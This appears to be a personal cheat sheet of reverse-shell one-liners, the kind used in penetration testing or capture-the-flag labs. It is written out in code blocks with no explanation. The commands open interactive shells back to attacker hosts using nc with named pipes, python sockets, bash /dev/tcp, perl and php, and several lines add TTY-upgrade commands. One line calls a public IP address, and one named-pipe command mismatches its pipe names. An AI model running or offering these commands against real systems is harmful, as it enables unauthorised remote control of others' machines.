```
mknod /tmp/schellman p & /bin/sh 0</tmp/bdfdf | nc 10.10.14.16 9001 1>/tmp/bdfdf
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("52.205.63.181",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
stty raw -echo

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 52.205.63.181 443 >/tmp/f
```

```
bash -i >& /dev/tcp/192.0.2.25/9001 0>&1
sh -i >& /dev/udp/127.0.0.1/443 0>&1

```

```
perl -e 'use Socket;$i="10.11.0.131";$p=9091;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("$BASH -i");};'
```

### php
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### nc
```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
